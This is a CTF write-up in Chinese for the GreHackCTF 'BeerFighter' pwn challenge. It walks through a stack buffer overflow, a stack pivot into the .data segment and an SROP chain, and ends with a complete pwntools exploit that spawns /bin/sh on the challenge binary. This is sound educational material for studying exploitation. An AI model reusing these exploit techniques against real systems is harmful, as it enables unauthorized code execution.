---
title: GreHackCTF - BeerFighter
categories: [learn, former-ctf]
tags: [pwn, stack-pivot, srop]
---

### 0x01 程序分析

main函数主要调用了:

```c++
__int64 new_comer()
{
  _BYTE v1[1024]; // [rsp+10h] [rbp-410h] BYREF
  int v2; // [rsp+410h] [rbp-10h] BYREF
  int v3; // [rsp+414h] [rbp-Ch] BYREF

  qmemcpy(v1, "Newcomer", sizeof(v1));
  v2 = 0;
  welcome(&v2, &dword_400BE0, &v3);
  while ( (unsigned int)core_function((__int64)v1) )
    ;
  sub_40025A(&unk_4007C0);
  return 0;
}
```

其把`rbp - 0x410` 作为参数：

```
.text:00000000004001CD                 lea     rax, [rbp+var_410]
.text:00000000004001D4                 mov     rdi, rax
.text:00000000004001D7                 call    core_function
```

在`core_function`中，只有选项`1`有实际逻辑：

```c++
__int64 __fastcall core_function(__int64 a1)
{
  ...
  sub_40025A("[0] The bar\n");
  sub_40025A("[1] The City Hall\n");
  sub_40025A("[2] The dark yard\n");
  sub_40025A("[3] Leave the town for ever\n");
  v1 = sub_400396("Type your action number > ", 0, 3);
  if ( v1 == 1 )
  {
    vuln(a1);
  }
  ...
}
```

然后就是往参数缓冲区写入2048字符，存在溢出：

```c++
__int64 __fastcall vuln(__int64 a1)
{
  ......
  else
  {
    sub_40025A("Type your character name here > ");
    sub_400332(v2, 2048, 0);
    sub_400446(a1, v2, 2048);
    return sub_40025A("\n");
  }
}
```

可以通过溢出修改控制流. 查找gadget:

```
2017/Exploit/250 - BeerFighter <master?> (nu)                                                                                                              [.venv14]
[woc@nixos]> ROPgadget --binary ./game --only "pop|rax|rdi|rsi|ret|syscall"
Gadgets information
============================================================
0x00000000004007b1 : pop r8 ; ret
0x00000000004007b2 : pop rax ; ret
0x0000000000400258 : pop rbp ; ret
0x00000000004007a7 : pop rsi ; ret
0x00000000004001f2 : ret
0x000000000040021b : ret 0x1bf
0x0000000000400423 : ret 0x3930
0x0000000000400254 : ret 0x8948
0x0000000000400274 : ret 0x8b48
0x00000000004002b0 : ret 0xbf
0x0000000000400770 : syscall

Unique gadgets found: 11
```

并没有`pop rdi`的gadget，这会对我们构造ROP链、以及装载rdi位置的"/bin/sh\x00" 带来困难.

但是程序提供了syscall，以及`pop rax`, 可以尝试SROP，通过在栈上伪造SigFrame, 来实现对寄存器的绝对控制.

我们的理想情况是：把rax设置为`0xf` (sig_return)，此时rsp对应的位置是我们伪造的SigFrame, 将rdi指向"/bin/sh", rax为59(execve), rip指向syscall gadget地址. 但还有一个问题没有解决：这个程序并没有找到任何信息泄漏的方法，无法泄漏栈指针，就无法知道我们写在栈上"/bin/sh\x00"的地址，无法填写rdi的值.

这种情况下我们就需要使用栈迁移，把rsp/rbp指针移动到已知的区间.

```
2017/Exploit/250 - BeerFighter <master?> (nu)                                                                                                              [.venv14]
[woc@nixos]> readelf -S ./game
There are 9 section headers, starting at offset 0x2068:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .note.gnu.bu[...] NOTE             0000000000400158  00000158
       0000000000000024  0000000000000000   A       0     0     4
  [ 2] .text             PROGBITS         000000000040017c  0000017c
       000000000000063c  0000000000000000  AX       0     0     1
  [ 3] .rodata           PROGBITS         00000000004007c0  000007c0
       0000000000000b93  0000000000000000   A       0     0     32
  [ 4] .eh_frame         PROGBITS         0000000000401358  00001358
       00000000000001f8  0000000000000000   A       0     0     8
  [ 5] .got              PROGBITS         0000000000601fe8  00001fe8
       0000000000000018  0000000000000008  WA       0     0     8
  [ 6] .data             PROGBITS         0000000000602000  00002000
       0000000000000006  0000000000000000  WA       0     0     1
  [ 7] .comment          PROGBITS         0000000000000000  00002006
       0000000000000011  0000000000000001  MS       0     0     1
  [ 8] .shstrtab         STRTAB           0000000000000000  00002017
       000000000000004a  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), l (large), p (processor specific)
```

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x400000           0x402000 r-xp     2000       0 game
          0x601000           0x603000 rw-p     2000    1000 game
    0x7ffff7ff7000     0x7ffff7ffb000 r--p     4000       0 [vvar]
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000       0 [vvar_vclock]
    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000       0 [vdso]
    0x7ffffffdc000     0x7ffffffff000 rw-p    23000       0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000       0 [vsyscall]
```

并没有`.bss`段，但是我们可以使用`.data`. (这里的Section大小为`0x2000`. 但是动态运行的时候Segment Address是`0x601000`，我们可以选择0x601000 + size/2 = 0x602000)


### 0x02 栈迁移研究

大部分函数都形如：

```asm
; -> 1
push    rbp
mov     rbp, rsp
sub     rsp, 420h
; -> 2
......
leave
retn
```

正常情况下从`1`位置入口：
1. `push rbp`, 此时栈上有返回地址、保存的rbp, 仍然是0x10对齐的.
2. `mov rbp, rsp`, 现在rbp有了新的值. 在当前函数中，引用栈上的数据都是通过rbp完成. 只要进入函数前的rsp合法即可，而旧的rbp被覆盖，不会影响
3. `sub     rsp, 420h`, 设置新的栈帧
4. `leave`，先执行`mov rsp, rbp`, 然后`pop rbp`
5. `ret`

这个过程中，栈上push/pop的值是平衡的.

如果我们控制了栈上的`saved rbp`值，执行`leave-ret`后，就可以控制rbp的值. 这之后，如果我们仍然从`1`开始执行，那么旧的rbp值被覆盖，并不会对执行过程产生什么影响；

但如果从`2`后开始执行，就会把我们先前控制的旧rbp赋给rsp, 将rsp迁移到我们想要的区域；同时从栈上弹出一个新的rbp值。这个过程有点像水泵，每次把旧的rbp赋给rsp, 并再泵入一个rbp.


总之：一次`leave-ret`控制rbp, 两次`leave-ret`控制rsp.

会过头来看这一题，我们能直接把rsp迁移到`.data`段上吗？如果这样做，在第二次`leave`指令，就会把`rsp`迁移过去，在执行后续的`ret`指令时，要求栈指针所在的地方有合法地址，这要求我们有提前往`.data`上写入数据的能力.

可是，这一题并没有`pop rdi`, 也不容易通过rop实现这一点.

那么，我们只能控制rbp了. 因为在函数中引用数据是通过它来实现的，所以我们要跳过开头的`pushd`部分，这样就能控制了.

```
.text:000000000040017C ; Attributes: bp-based frame
.text:000000000040017C
.text:000000000040017C new_comer       proc near               ; CODE XREF: start+B↓p
.text:000000000040017C
.text:000000000040017C var_420         = qword ptr -420h
.text:000000000040017C var_414         = dword ptr -414h
.text:000000000040017C var_410         = byte ptr -410h
.text:000000000040017C var_10          = dword ptr -10h
.text:000000000040017C
.text:000000000040017C ; __unwind {
.text:000000000040017C                 push    rbp
.text:000000000040017D                 mov     rbp, rsp
.text:0000000000400180                 sub     rsp, 420h
.text:0000000000400187                 mov     [rbp+var_414], edi
.text:000000000040018D                 mov     [rbp+var_420], rsi
.text:0000000000400194                 lea     rdx, [rbp+var_410]
.text:000000000040019B                 lea     rax, aNewcomer  ; "Newcomer"
.text:00000000004001A2                 mov     ecx, 80h
.text:00000000004001A7                 mov     rdi, rdx
.text:00000000004001AA                 mov     rsi, rax
.text:00000000004001AD                 rep movsq
.text:00000000004001B0                 mov     rax, rsi
.text:00000000004001B3                 mov     rdx, rdi
.text:00000000004001B6                 mov     ecx, [rax]
.text:00000000004001B8                 mov     [rdx], ecx
.text:00000000004001BA                 lea     rdx, [rdx+4]
.text:00000000004001BE                 lea     rax, [rax+4]
.text:00000000004001C2                 mov     eax, 0
.text:00000000004001C7                 call    welcome
.text:00000000004001CC                 nop
.text:00000000004001CD
.text:00000000004001CD loc_4001CD:                             ; CODE XREF: new_comer+62↓j
.text:00000000004001CD                 lea     rax, [rbp+var_410]
.text:00000000004001D4                 mov     rdi, rax
.text:00000000004001D7                 call    core_function
.text:00000000004001DC                 test    eax, eax
.text:00000000004001DE                 jnz     short loc_4001CD
.text:00000000004001E0                 lea     rdi, unk_4007C0
.text:00000000004001E7                 call    sub_40025A
.text:00000000004001EC                 mov     eax, 0
.text:00000000004001F1                 leave
.text:00000000004001F2                 retn
.text:00000000004001F2 ; } // starts at 40017C
.text:00000000004001F2 new_comer       endp
```

我们可以直接跳到 `4001CD`. (这里不能直接跳到`vuln`函数，因为它发生溢出的数据是通过参数传过来的，所以需要继续往外找)

### 0x03 Exploit

```python
#!/usr/bin/env python3
import sys

# record arg before importing pwntools(which will comsume the DEBUG arg)
RAW_ARGS = tuple(sys.argv[1:])

from pwn import *
import os
import shutil

elf = ELF("./game", checksec=False)

HOST = "some.website"
PORT = 1337
SSL = False

context.binary = elf
context.arch = "amd64"
context.gdb_binary = "/home/woc/.nix-profile/bin/pwndbg"

if os.environ.get("TMUX"):
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ.get("DISPLAY"):
    for terminal in ("ghostty", "alacritty", "kitty", "konsole"):
        if shutil.which(terminal):
            context.terminal = [terminal, "-e"]
            break

gdbscript = r"""
set pagination off
set breakpoint pending on
set auto-solib-add on
c
"""

def start():
    def has_flag(name):
        return name in RAW_ARGS or any(arg.startswith(name + "=") for arg in RAW_ARGS)

    remote_enabled = has_flag("REMOTE") or bool(args.REMOTE)
    debug_enabled = (
        has_flag("DEBUG")
        or has_flag("GDB")
        or bool(args.DEBUG)
        or bool(args.GDB)
    )

    if remote_enabled:
        return remote(HOST, PORT, ssl=SSL)

    if debug_enabled:
        p = process([elf.path])
        log.info("Attaching gdb using terminal: %r", context.terminal)
        gdb.attach(p, gdbscript=gdbscript)
        return p

    return process([elf.path])


p = start()

# ===== exploit here =====



new_rbp = 0x602000
leave_ret_gadget = 0x4001F1
pop_rax_ret_gadget = 0x4007b2
# ret_gadget = 0x4007B0
syscall_gadget = 0x400770

again = 0x4001CD

payload1 = flat(
    #
    b'A' * 0x410,
    new_rbp,
    again
)

area2 = new_rbp - 0x410
frame = SigreturnFrame()    # len(frame) == 0xf8
frame.rax = 59  # execve syscall
frame.rdi = area2
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget

payload2 = b'/bin/sh\x00'.ljust(0x410, b'A')
payload2 += p64(0)      # new rbp, doesn't matter
payload2 += p64(pop_rax_ret_gadget)
payload2 += p64(0xf)
payload2 += p64(syscall_gadget)
payload2 += bytes(frame)
# cannot appear '\n'==0x0a in our payload

p.recvuntil(b'Type your action number > ')
p.sendline(b'1')

p.recvuntil(b'Type your action number >')
p.sendline(b'0')

p.sendline(payload1)
p.sendline(b'3')    # trigger return. then we can hijack the program


p.recvuntil(b'Type your action number > ')
p.sendline(b'1')

p.recvuntil(b'Type your action number >')
p.sendline(b'0')

p.sendline(payload2)
p.sendline(b'3')    # trigger return. then we can hijack the program

p.interactive()
```

